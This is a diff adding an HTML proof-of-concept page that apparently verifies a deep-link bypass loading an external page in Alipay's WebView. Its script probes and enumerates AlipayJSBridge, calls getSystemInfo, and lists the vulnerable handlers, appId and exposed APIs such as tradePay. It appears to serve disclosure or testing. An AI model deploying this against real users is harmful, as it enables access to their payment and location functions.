@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CVE-1 Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,system-ui,sans-serif;background:#fff;color:#333;padding:16px}
+.banner{background:#f5222d;color:#fff;padding:16px;border-radius:10px;text-align:center;margin-bottom:16px}
+.banner h1{font-size:18px}
+.banner p{font-size:12px;opacity:.85;margin-top:4px}
+.result{background:#f6ffed;border:2px solid #52c41a;border-radius:10px;padding:16px;margin:12px 0}
+.result h2{color:#389e0d;font-size:15px;margin-bottom:8px}
+.fail{background:#fff2f0;border-color:#ff4d4f}
+.fail h2{color:#cf1322}
+.item{padding:6px 0;border-bottom:1px solid #f0f0f0;font-size:13px}
+.item:last-child{border:none}
+.label{color:#888;font-size:11px}
+.value{color:#333;font-weight:600}
+.ts{color:#999;font-size:10px;text-align:center;margin-top:16px}
+#status{font-size:14px;color:#1677ff;text-align:center;padding:20px}
+</style>
+</head><body>
+
+<div class="banner">
+  <h1>CVE-1: DeepLink URL Scheme Bypass</h1>
+  <p>CWE-939 | CVSS 9.1 | External URL loaded in Alipay WebView</p>
+</div>
+
+<div id="status">Checking environment...</div>
+<div id="results"></div>
+<div class="ts" id="timestamp"></div>
+
+<script>
+var results = [];
+var el = document.getElementById('results');
+var status = document.getElementById('status');
+
+function log(category, key, value, severity) {
+  results.push({category:category, key:key, value:value, severity:severity, time:new Date().toISOString()});
+}
+
+function render() {
+  var html = '';
+
+  // Basic proof: this page loaded inside Alipay WebView
+  html += '<div class="result"><h2>PROOF: External Page Loaded in Alipay WebView</h2>';
+  html += '<div class="item"><span class="label">Page Origin: </span><span class="value">' + location.origin + '</span></div>';
+  html += '<div class="item"><span class="label">Full URL: </span><span class="value" style="word-break:break-all;font-size:11px">' + location.href + '</span></div>';
+  html += '<div class="item"><span class="label">User Agent: </span><span class="value" style="word-break:break-all;font-size:10px">' + navigator.userAgent + '</span></div>';
+  html += '<div class="item"><span class="label">Timestamp: </span><span class="value">' + new Date().toISOString() + '</span></div>';
+
+  // Check if running inside Alipay
+  var isAlipay = /AlipayClient|Nebula/i.test(navigator.userAgent);
+  html += '<div class="item"><span class="label">Inside Alipay WebView: </span><span class="value" style="color:' + (isAlipay ? '#52c41a' : '#faad14') + '">' + (isAlipay ? 'YES - CONFIRMED' : 'Not detected in UA (may still be inside Alipay)') + '</span></div>';
+  html += '</div>';
+
+  // JSBridge availability
+  html += '<div class="result' + (window.AlipayJSBridge ? '' : ' fail') + '"><h2>JSBridge Access</h2>';
+  html += '<div class="item"><span class="label">AlipayJSBridge: </span><span class="value">' + (window.AlipayJSBridge ? 'AVAILABLE - CRITICAL' : 'Not yet loaded') + '</span></div>';
+  html += '<div class="item"><span class="label">ap object: </span><span class="value">' + (window.ap ? 'AVAILABLE' : 'Not available') + '</span></div>';
+
+  if (window.AlipayJSBridge) {
+    // List available methods
+    var methods = [];
+    try {
+      for (var k in AlipayJSBridge) {
+        if (typeof AlipayJSBridge[k] === 'function') methods.push(k);
+      }
+    } catch(e) {}
+    html += '<div class="item"><span class="label">Bridge Methods: </span><span class="value">' + (methods.length > 0 ? methods.join(', ') : 'call() available') + '</span></div>';
+  }
+  html += '</div>';
+
+  // Navigation proof
+  html += '<div class="result"><h2>Attack Vector Proof</h2>';
+  html += '<div class="item"><span class="label">Entry: </span><span class="value">Safari browser link → alipays:// scheme</span></div>';
+  html += '<div class="item"><span class="label">Handler: </span><span class="value">SchemeLauncherActivity (no host/path constraint)</span></div>';
+  html += '<div class="item"><span class="label">Router: </span><span class="value">SchemeServiceImpl.process(Uri) — no auth guard</span></div>';
+  html += '<div class="item"><span class="label">WebView: </span><span class="value">appId=20000067 H5 container loads arbitrary URL</span></div>';
+  html += '<div class="item"><span class="label">Result: </span><span class="value" style="color:#f5222d">External attacker page running inside Alipay with JSBridge access</span></div>';
+  html += '</div>';
+
+  // Evidence
+  html += '<div class="result"><h2>Evidence Summary</h2>';
+  html += '<div class="item"><span class="label">Vulnerability: </span><span class="value">External browser can open any URL inside Alipay WebView via DeepLink</span></div>';
+  html += '<div class="item"><span class="label">Root Cause: </span><span class="value">SchemeServiceImpl.process() dispatches URI without authentication</span></div>';
+  html += '<div class="item"><span class="label">Impact: </span><span class="value">Attacker page gains access to all JSBridge APIs (getLocation, tradePay, setTitle, showToast, startApp)</span></div>';
+  html += '</div>';
+
+  el.innerHTML = html;
+  document.getElementById('timestamp').textContent = 'Evidence collected at: ' + new Date().toISOString();
+}
+
+// Wait for bridge
+function checkBridge() {
+  if (window.AlipayJSBridge) {
+    status.textContent = 'AlipayJSBridge DETECTED — Vulnerability confirmed';
+    status.style.color = '#f5222d';
+    log('cve1', 'bridge_available', true, 'CRITICAL');
+
+    // Try to get some basic info via bridge
+    try {
+      AlipayJSBridge.call('getSystemInfo', {}, function(result) {
+        log('cve1', 'systemInfo', JSON.stringify(result), 'HIGH');
+        render();
+      });
+    } catch(e) {}
+
+    render();
+  } else {
+    status.textContent = 'Page loaded at ' + location.origin + ' — Waiting for AlipayJSBridge...';
+    render();
+  }
+}
+
+document.addEventListener('AlipayJSBridgeReady', function() {
+  log('cve1', 'bridge_ready_event', true, 'CRITICAL');
+  checkBridge();
+});
+
+// Check immediately and after delays
+checkBridge();
+setTimeout(checkBridge, 1000);
+setTimeout(checkBridge, 3000);
+setTimeout(checkBridge, 5000);
+</script>
+</body></html>
